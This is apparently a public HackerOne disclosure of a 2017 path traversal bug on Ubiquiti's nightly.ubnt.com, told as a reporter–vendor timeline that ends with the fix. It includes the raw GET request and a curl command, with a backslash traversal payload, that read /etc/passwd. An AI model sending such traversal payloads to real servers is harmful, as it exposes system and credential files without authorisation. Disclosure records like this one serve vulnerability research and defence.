---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
date: 2017-10-10
submitted: 2017-05-18T13:43:30.530Z
bounty_usd: null
votes: 26
cve: []
program: "[[programs/ui|Ubiquiti Inc.]]"
reporter: "grampae"
source: "https://hackerone.com/reports/229622"
title: "Directory traversal at https://nightly.ubnt.com"
---
# Directory traversal at https://nightly.ubnt.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 26 | **Program:** Ubiquiti Inc. | **Disclosed:** 2017-10-10

- Report: [https://hackerone.com/reports/229622](https://hackerone.com/reports/229622)
- CWE: Path Traversal
- Submitted: 2017-05-18T13:43:30.530Z

## Timeline

- **Report Filed**
- **2017-05-18** @grampae: Also, here is the GET request from within Ironwasp:
GET /css/..\\..\\\..\\\..\\\/etc/passwd HTTP/1.1
Host: nightly.ubnt.com
User-Agent: Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Accept: */*
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8
- **2017-05-18** @grampae: Just use this curl command in a windows command prompt to view the directory traversal

curl --insecure -v https://nightly.ubnt.com/css/..\\..\\\..\\\..\\\/etc/passwd
- **Report Triaged**
- **Bounty Awarded**
- **2017-05-22** @grampae: Thank you for the bounty and quickly taking care of this issue.  I can't help but think that this is a small bounty for how serious this issue was.  It is publicly known that a local file include bug can easily be turned into a rce or root shell.

I wanted to disclose the issue to you quickly, however being thrown 500 with little to no comment doesn't leave a good taste in my mouth for this program.

-Matt
- **2017-05-22** @ubnt-rubens: Hi @grampae,

The vulnerability itself isn't very impacting, because the server is in an isolated environment. Nevertheless we fixed the problem.

Before we close it "Resolved", could you please verify the fix? If you find a bypass for it we will give a bonus in the reward.

Thanks
- **2017-05-22** @grampae: Hey @ubnt-rubens ,
Thank you for the explanation.  I understand your reasoning even if I don't quite agree, as when anyone goes to https://nightly.ubnt.com they are automatically forwarded to https://account.ubnt.com/login?redirect=https%3A%2F%2Fnightly.ubnt.com%2F%23%2F to log in to their account first.  If nightly was compromised the end user could be forwarded to any host the attacker specifies setting up a false login to look just like account.ubnt.com.  In fact any link on the nightly.ubnt.com could be used to gather information on customers.   Not what I would call isolated.  Anyhow the problem seems to be fixed.
- **2017-05-22** @grampae: Also can you please look at report #158287 I believe that firmware has been released which would close the report as resolved.  Thank you.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
